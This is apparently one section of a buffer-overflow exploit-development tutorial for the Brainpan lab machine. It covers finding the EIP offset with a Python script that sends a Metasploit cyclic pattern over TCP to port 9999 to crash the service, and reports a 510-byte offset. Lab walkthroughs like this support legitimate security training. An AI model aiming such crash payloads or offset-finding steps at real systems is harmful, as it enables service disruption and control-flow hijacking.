# Finding the offset

In the previous section, we used a fuzzing script to find an approximate bytes size where it crashed. Previously the buffer overflow with ``1000 bytes``. Now, we need to find the offset where the ``EIP`` was overwritten.

To achieve this, we need to generate a unique pattern using the ``Metasploit`` module. We will generate the pattern based on the result we got from the previous fuzzing process.

Now we can send the generated pattern to the TCP server to get the exact point where ``EIP`` was overwritten. I created another script called [brainpan_fuzzer2.py](https://github.com/cris-m/buffer_overflow_exploit_development/blob/main/assets/resources/brainpan_fuzzer2.py).

```python
#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.10.4', 9999))
        payload = b'shitstorm /.:/' + buffer
        sock.send(payload)
        sock.close()
    except:
        print("Error connecting to the server")
        sys.exit()
```

I executed the script, the buffer overflown. I went on Windows side to check what was going on in ``Immunity Debugger``. The overwritten value of the ``EIP`` is ``41307241``
![alt Immunity debugger EIP](../images/brainpan13.png  "Get the exact point where the EIP was overwritten")

Now, we are going to use another ``Metasploit`` module to find the exact match for our offset. We will get the offset based on the value of ``EIP`` and the length of pattern which was generated previously.

![alt Get offset](../images/brainpan14.png  "Getting the offset")

As we can see in the screenshot above, we managed to find the exact match for our offset at ``510`` bytes. Now itâ€™s time to overwrite the ``EIP``.
